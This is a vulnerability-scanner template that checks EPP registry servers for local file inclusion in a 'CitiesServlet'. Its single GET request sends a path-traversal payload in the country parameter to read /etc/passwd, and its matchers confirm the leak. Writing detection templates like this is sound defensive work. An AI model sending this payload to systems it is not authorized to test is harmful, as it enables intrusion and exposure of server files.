id: epp-server-lfi
name: EPP Server - Local File Inclusion
severity: high
confidence: tentative
description: servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the
  country parameter, is directly concatenated with the "/cities/cities_" string to form the fileName, This means an attacker
  can manipulate the country parameter and potentially access arbitrary files on the server's file system
reference: https://hackcompute.com/hacking-epp-servers/
tags:
- epp
- cocca
- registry
- vuln
requests:
- method: GET
  path: /cities?country=/../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: header
    words:
    - application/json
  - type: status
    status:
    - 200
  condition: and
